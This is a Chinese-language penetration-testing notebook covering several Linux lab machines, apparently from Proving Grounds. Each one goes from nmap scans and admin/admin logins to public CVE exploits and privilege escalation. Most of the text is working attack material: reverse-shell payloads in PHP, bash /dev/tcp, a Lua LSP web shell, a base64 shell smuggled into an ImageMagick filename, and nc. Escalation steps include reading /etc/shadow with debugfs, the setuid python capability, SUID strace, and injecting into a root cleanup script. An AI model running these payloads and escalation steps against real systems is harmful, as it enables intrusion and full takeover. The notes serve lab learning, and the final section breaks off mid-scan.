![image-20250222192023641](./PG_linux.assets/image-20250222192023641.png)

尝试admin/admin登录成功

![image-20250222192054633](./PG_linux.assets/image-20250222192054633.png)

修改exp脚本内容

![image-20250222192559222](./PG_linux.assets/image-20250222192559222.png)

直接执行sh反弹shell失，估计是V*N的问题，检索漏洞CVE-2022-23940，换一个脚本

https://github.com/manuelz120/CVE-2022-23940

```
python3 exploit.py -h http://192.168.216.146/ -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.184\", 3000); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
```

成功拿到shell

![image-20250222195131888](./PG_linux.assets/image-20250222195131888.png)

拿到local

![image-20250222195252715](./PG_linux.assets/image-20250222195252715.png)

常规信息收集

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
sudo -l
```

`sudo -l`发现service可以sudo免密码执行

![image-20250222195351105](./PG_linux.assets/image-20250222195351105.png)

```
sudo /usr/sbin/service ../../bin/sh
```

![image-20250222195503107](./PG_linux.assets/image-20250222195503107.png)

拿到proof

![image-20250222195541322](./PG_linux.assets/image-20250222195541322.png)



## Levram

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.24
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-22 19:56 CST
Nmap scan report for 192.168.216.24
Host is up (0.0036s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sat, 22 Feb 2025 11:57:02 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html
|     Content-Length: 9979
|     Vary: Origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:top; padding:2px 3px; }
|     width:12em; text-align:right; color:#6
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 22 Feb 2025 11:56:57 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept, Origin
|     Allow: GET, OPTIONS
|     Content-Length: 2530
|_    <!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=/favicon.ico><title>Gerapy</title><link href=/static/css/chunk-10b2edc2.79f68610.css rel=prefetch><link href=/static/css/chunk-12e7e66d.8f856d8c.css rel=prefetch><link href=/static/css/chunk-39423506.2eb0fec8.css rel=prefetch><link href=/static/css/chunk-3a6102b3.0fe5e5eb.css rel=prefetch><link href=/static/css/chunk-4a7237a2.19df386b.css rel=prefetch><link href=/static/css/chunk-531d1845.b0b0d9e4.css rel=prefetch><link href=/static/css/chunk-582dc9b0.d60b5161.css rel=prefetch><link href=/static/css/chun
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=2/22%Time=67B9BB89%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,AAA,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2022\x20Feb\x202
SF:025\x2011:56:57\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.10\.
SF:6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVary:\x20Accept,\x
SF:20Origin\r\nAllow:\x20GET,\x20OPTIONS\r\nContent-Length:\x202530\r\n\r\
SF:n<!DOCTYPE\x20html><html\x20lang=en><head><meta\x20charset=utf-8><meta\
SF:x20http-equiv=X-UA-Compatible\x20content=\"IE=edge\"><meta\x20name=view
SF:port\x20content=\"width=device-width,initial-scale=1\"><link\x20rel=ico
SF:n\x20href=/favicon\.ico><title>Gerapy</title><link\x20href=/static/css/
SF:chunk-10b2edc2\.79f68610\.css\x20rel=prefetch><link\x20href=/static/css
SF:/chunk-12e7e66d\.8f856d8c\.css\x20rel=prefetch><link\x20href=/static/cs
SF:s/chunk-39423506\.2eb0fec8\.css\x20rel=prefetch><link\x20href=/static/c
SF:ss/chunk-3a6102b3\.0fe5e5eb\.css\x20rel=prefetch><link\x20href=/static/
SF:css/chunk-4a7237a2\.19df386b\.css\x20rel=prefetch><link\x20href=/static
SF:/css/chunk-531d1845\.b0b0d9e4\.css\x20rel=prefetch><link\x20href=/stati
SF:c/css/chunk-582dc9b0\.d60b5161\.css\x20rel=prefetch><link\x20href=/stat
SF:ic/css/chun")%r(FourOhFourRequest,279E,"HTTP/1\.1\x20404\x20Not\x20Foun
SF:d\r\nDate:\x20Sat,\x2022\x20Feb\x202025\x2011:57:02\x20GMT\r\nServer:\x
SF:20WSGIServer/0\.2\x20CPython/3\.10\.6\r\nContent-Type:\x20text/html\r\n
SF:Content-Length:\x209979\r\nVary:\x20Origin\r\n\r\n<!DOCTYPE\x20html>\n<
SF:html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20http-equiv=\"content-typ
SF:e\"\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20<title>Page\x2
SF:0not\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak</title>\n\x20\
SF:x20<meta\x20name=\"robots\"\x20content=\"NONE,NOARCHIVE\">\n\x20\x20<st
SF:yle\x20type=\"text/css\">\n\x20\x20\x20\x20html\x20\*\x20{\x20padding:0
SF:;\x20margin:0;\x20}\n\x20\x20\x20\x20body\x20\*\x20{\x20padding:10px\x2
SF:020px;\x20}\n\x20\x20\x20\x20body\x20\*\x20\*\x20{\x20padding:0;\x20}\n
SF:\x20\x20\x20\x20body\x20{\x20font:small\x20sans-serif;\x20background:#e
SF:ee;\x20color:#000;\x20}\n\x20\x20\x20\x20body>div\x20{\x20border-bottom
SF::1px\x20solid\x20#ddd;\x20}\n\x20\x20\x20\x20h1\x20{\x20font-weight:nor
SF:mal;\x20margin-bottom:\.4em;\x20}\n\x20\x20\x20\x20h1\x20span\x20{\x20f
SF:ont-size:60%;\x20color:#666;\x20font-weight:normal;\x20}\n\x20\x20\x20\
SF:x20table\x20{\x20border:none;\x20border-collapse:\x20collapse;\x20width
SF::100%;\x20}\n\x20\x20\x20\x20td,\x20th\x20{\x20vertical-align:top;\x20p
SF:adding:2px\x203px;\x20}\n\x20\x20\x20\x20th\x20{\x20width:12em;\x20text
SF:-align:right;\x20color:#6");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/22%OT=22%CT=1%CU=39242%PV=Y%DS=4%DC=T%G=Y%TM=67B9BBE
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT     ADDRESS
1   2.31 ms 192.168.45.1
2   2.32 ms 192.168.45.254
3   2.82 ms 192.168.251.1
4   3.59 ms 192.168.216.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.99 seconds
```

开放了8000的http服务，检索exp

![image-20250222202913292](./PG_linux.assets/image-20250222202913292.png)

需要认证，尝试一手admin/admin成功进入系统

![image-20250222202936393](./PG_linux.assets/image-20250222202936393.png)

使用exp报错懒得处理，[CVE-2021-43857](https://www.cnblogs.com/colin-B/p/15796480.html)，直接发送数据包：

```
POST /api/project/1/parse HTTP/1.1
Host: 192.168.216.24:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Token bab40ccd50ebd5bbaa28f14015330b4d00a824b8
Connection: close
Referer: http://vulfocus.fofa.so:37380/
Cookie: zbx_sessionid=80402dd7222257588aeff3a3f5a4b7af; td_cookie=448830462; Hm_lvt_b5514a35664fd4ac6a893a1e56956c97=1639631760; zmGroup=1; Hm_lvt_deaeca6802357287fb453f342ce28dda=1640325563
Cache-Control: max-age=0
Content-Length: 79
Content-Type: application/x-www-form-urlencoded

{
	"spider":"`/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.184/3000 0>&1'`"
}
```

![image-20250222203854647](./PG_linux.assets/image-20250222203854647.png)

成功反弹shell，拿到local

![image-20250222204050128](./PG_linux.assets/image-20250222204050128.png)

常规检查GUID和sudo -l无果，上传linpeas.sh

![image-20250222205018086](./PG_linux.assets/image-20250222205018086.png)

CVE-2021-4034_PwnKit提权失败

![image-20250222205148709](./PG_linux.assets/image-20250222205148709.png)

没思路，看了下hints，这里新学到了一个`Capabilities提权`

> 我们运行SUID的命令时，通常只是需要使用一小部分特权，但是使用SUID，却可以拥有root用户的全部权限。所以，一旦SUID的文件存在漏洞，便可能被利用，以root身份执行其他操作。
>
> SUID的问题，主要在于权限控制太粗糙。为了对root身份进行更加精细的控制，Linux增加了另一种机制，即capabilities。

| 改变文件的所属者(chown())                          | CAP_CHOWN      |
| :------------------------------------------------- | :------------- |
| 向进程发送信号(kill(), signal())                   | CAP_KILL       |
| 改变进程的uid(setuid(), setreuid(), setresuid()等) | CAP_SETUID     |
| trace进程(ptrace())                                | CAP_SYS_PTRACE |
| 设置系统时间(settimeofday(), stime()等)            | CAP_SYS_TIME   |

```
getcap -r / 2>/dev/null
```

![image-20250222210347527](./PG_linux.assets/image-20250222210347527.png)

python有`setuid`权限

```
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

![image-20250222210451839](./PG_linux.assets/image-20250222210451839.png)

成功提权，拿到proof



## Extplorer

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.16
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-22 21:06 CST
Nmap scan report for 192.168.216.16
Host is up (0.0036s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (91%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Infomir MAG-250 set-top box (86%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   2.98 ms 192.168.45.1
2   2.97 ms 192.168.45.254
3   3.15 ms 192.168.251.1
4   3.63 ms 192.168.216.16

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.16 seconds
```

开放了80的http端口，是一个WordPress站点

![image-20250222212720472](./PG_linux.assets/image-20250222212720472.png)

WordPress没有和数据库建立连接，尝试了root/root不行，可能都没有运行数据库，入口应该不在WordPress，使用dirsearch扫描目录发现`filemanager`

![image-20250222223453531](./PG_linux.assets/image-20250222223453531.png)

发现extplorer服务，检索漏洞

![image-20250222223525986](./PG_linux.assets/image-20250222223525986.png)

有一个需要认证的RCE，使用admin/admin成功登录系统

![image-20250222223642579](./PG_linux.assets/image-20250222223642579.png)

脚本不好用，直接手撸！

用文件管理器上传一个php一句话，就能getshell

![image-20250222225323942](./PG_linux.assets/image-20250222225323942.png)

拿到shell

![image-20250222230957706](./PG_linux.assets/image-20250222230957706.png)

翻找到一个隐藏文件

![image-20250222231951448](./PG_linux.assets/image-20250222231951448.png)

找到了用户hash

![image-20250222232013988](./PG_linux.assets/image-20250222232013988.png)

john破解得到明文密码doraemon

![image-20250222232110291](./PG_linux.assets/image-20250222232110291.png)

拿到lcoal

![image-20250222232207919](./PG_linux.assets/image-20250222232207919.png)

上传linpeas.sh，发现用户有disk权限

> 当用户位于磁盘组时，我们可以利用 debugfs 以 root 权限读取文件。

![image-20250222235315820](./PG_linux.assets/image-20250222235315820.png)

通过debugfs读取/etc/shadow

```
df -h
debugfs -w /dev/mapper/ubuntu--vg-ubuntu--lv
cat /etc/shadow
```

拿到root的hash使用john破解

![image-20250223001715022](./PG_linux.assets/image-20250223001715022.png)

![image-20250223000725791](./PG_linux.assets/image-20250223000725791.png)



切换root，拿到proof

![image-20250223000630968](./PG_linux.assets/image-20250223000630968.png)



## Hub

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.25
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-23 11:42 CST
Nmap scan report for 192.168.216.25
Host is up (0.0038s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
8082/tcp open  http     Barracuda Embedded Web Server
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-server-header: BarracudaServer.com (Posix)
|_http-title: Home
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Posix)
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_  Server Date: Sun, 23 Feb 2025 03:43:11 GMT
9999/tcp open  ssl/http Barracuda Embedded Web Server
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-server-header: BarracudaServer.com (Posix)
|_http-title: Home
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Posix)
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_  Server Date: Sun, 23 Feb 2025 03:43:10 GMT
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/23%OT=22%CT=1%CU=40396%PV=Y%DS=4%DC=T%G=Y%TM=67BA994
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT     ADDRESS
1   3.72 ms 192.168.45.1
2   3.71 ms 192.168.45.254
3   3.80 ms 192.168.251.1
4   3.94 ms 192.168.216.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.63 seconds
```

开放了8082的http和9999的https服务，两个页面是一个服务

![image-20250223123347950](./PG_linux.assets/image-20250223123347950.png)

在about页面可以找到框架名字和版本

![image-20250223123609792](./PG_linux.assets/image-20250223123609792.png)

按照exp的要求注册好账号

![image-20250223123906972](./PG_linux.assets/image-20250223123906972.png)

exp有点问题没办法用，直接根据复现文章上传lsp文件访问即可

```lsp
<h2> Check ur nc listener on the port you put in </h2>

<?lsp if request:method() == "GET" then ?>
    <?lsp
        local host, port = "192.168.45.184", 3000
        local socket = require("socket")
        local tcp = socket.tcp()
        local io = require("io")
        
        tcp:connect(host, port) 
        
        while true do
            local cmd, status, partial = tcp:receive()
            local f = io.popen(cmd, "r")
            local s = f:read("*a")
            f:close()
            tcp:send(s)
            
            if status == "closed" then 
                break
            end
        end
        
        tcp:close()
    ?>
<?lsp else ?>
    Wrong request method, goodBye!
<?lsp end ?>
```

![image-20250223142132868](./PG_linux.assets/image-20250223142132868.png)

拿到shell，还是root权限

![image-20250223141948145](./PG_linux.assets/image-20250223141948145.png)

拿到proof

![image-20250223142038975](./PG_linux.assets/image-20250223142038975.png)



## Image

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.178
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-23 14:25 CST
Nmap scan report for 192.168.216.178
Host is up (0.0032s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: ImageMagick Identifier
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/23%OT=22%CT=1%CU=40853%PV=Y%DS=4%DC=T%G=Y%TM=67BABF7
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT     ADDRESS
1   2.66 ms 192.168.45.1
2   2.68 ms 192.168.45.254
3   2.88 ms 192.168.251.1
4   3.15 ms 192.168.216.178

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.23 seconds
```

开放了80的http服务，访问，尝试直接上传了.php文件不行，.png文件是可以的

![image-20250223143156626](./PG_linux.assets/image-20250223143156626.png)

通过该页面确定版本`ImageMagick 6.9.6-4`，检索漏洞

![image-20250223143527051](./PG_linux.assets/image-20250223143527051.png)

试了很多exp即麻烦还没打通，查看hints发现可以百度搜索6.9.6-4版本问题，发现一个issue：https://github.com/ImageMagick/ImageMagick/issues/6339

正确的编号为：CVE-2023-34152（感觉很多时候都是没找对漏洞，掉进了兔子洞

> [CVE-2016-5118](https://github.com/advisories/GHSA-6w95-mr48-gp8c) 显示，打开任何文件名以 '|' 字符开头的图像文件，ImageMagick 将调用`popen`处理文件名的其余部分。
>
> #### 触发:给定一个正常的图像文件，即 swap.jpg，以下操作会触发该漏洞：
>
> ```
> cp swap.jpg '|smile"`echo <base64_bash_reverse_shell> | base64 -d | bash`".jpg'
> ```

随便找个图片swap.jpg，执行下面命令

```
cp swap.jpg '|smile"`echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xODQvOTAwMSAwPiYx | base64 -d | bash`".jpg'
```

成功拿到shell

![image-20250223152227991](./PG_linux.assets/image-20250223152227991.png)

拿到local

![image-20250223152531139](./PG_linux.assets/image-20250223152531139.png)

查看SUID，发现strace命令

![image-20250223152457108](./PG_linux.assets/image-20250223152457108.png)

```
strace -o /dev/null /bin/sh -p
```

拿到proof

![image-20250223152636688](./PG_linux.assets/image-20250223152636688.png)

## law

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.190
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-23 15:38 CST
Nmap scan report for 192.168.216.190
Host is up (0.0027s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: htmLawed (1.2.5) test
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/23%OT=22%CT=1%CU=32512%PV=Y%DS=4%DC=T%G=Y%TM=67BAD0A
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=110%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11
OS:NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT     ADDRESS
1   1.72 ms 192.168.45.1
2   1.74 ms 192.168.45.254
3   2.58 ms 192.168.251.1
4   2.74 ms 192.168.216.190

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.66 seconds
```

开放了80的http端口，并且有服务名和版本信息

![image-20250223154246709](./PG_linux.assets/image-20250223154246709.png)

检索htmlLawed框架有关exp

![image-20250223161527009](./PG_linux.assets/image-20250223161527009.png)

exp不能用，甚至正常web服务都不能用，这里踩了一个坑

> 漏洞定义中的 uri 位置当前为“/vendor/htmlawed/htmlawed/htmLawedTest.php”，让我们手动浏览该路径。Gobuster 未能找到 vendor 目录，因此我怀疑它并不存在。在这种情况下，它很可能被表示为“index.php”。
>
> 修改脚本的htmLawedTest.php为index.php

![image-20250223163038822](./PG_linux.assets/image-20250223163038822.png)

然后执行成功执行默认的id命令

```
python3 CVE-2022-35914.py -u http://192.168.216.190/
```

![image-20250223163024512](./PG_linux.assets/image-20250223163024512.png)

```
python3 CVE-2022-35914.py -u http://192.168.216.190/ -c 'nc -c sh 192.168.45.184 3000'
```

![image-20250223163440794](./PG_linux.assets/image-20250223163440794.png)

成功反弹shell，拿到local

![image-20250223163512886](./PG_linux.assets/image-20250223163512886.png)

尝试运行lse.sh

> 该工具从2.0版本开始符合POSIX标准，并且经过了shellcheck和posh测试。它可以监控进程以发现重复的程序执行，并且能够在执行所有其他测试时持续进行监控，并为我们节省一些时间。默认情况下，它会监控1分钟，但我们可以使用-p参数选择监控的持续时间。
>
> 该工具提供了三种Verbose模式级别，我们可以根据需求控制所看到的信息量：
>
> > 1、在默认级别中，我们会看到系统中非常重要的安全漏洞信息；
> >
> > 2、级别1( ./lse.sh -l1) 显示有助于获得特权相关的有趣信息；
> >
> > 3、级别2( ./lse.sh -l2) 将转储它收集的有关目标系统的所有信息；

执行

```
./lse.sh -l1
```

网上hints说是这里清理联想到cleanup.sh文件（我是没太看出来

> 后面看了其他人的思路，发现一个很好的软件：https://github.com/DominicBreuker/pspy
>
> 使用：
>
> 给[pspy32s](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s)可执行权限，让它运行一段时间并观察结果，此工具帮助我们递归地监控运行过程。（很好的工具
>
> ![image-20250223172621580](./PG_linux.assets/image-20250223172621580.png)

![image-20250223171705763](./PG_linux.assets/image-20250223171705763.png)

cleanup.sh在这里

![image-20250223171752207](./PG_linux.assets/image-20250223171752207.png)

将反弹shell命令输入到文件后面

```
echo "sh -i >& /dev/tcp/192.168.45.184/9001 0>&1" >>cleanup.sh
```

拿到proof

![image-20250223171936977](./PG_linux.assets/image-20250223171936977.png)

## Lavita

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.38
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-24 08:54 CST
Nmap scan report for 192.168.216.38
Host is up (0.0026s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: W3.CSS Template
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/24%OT=22%CT=1%CU=44525%PV=Y%DS=4%DC=T%G=Y%TM=67BBC34
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
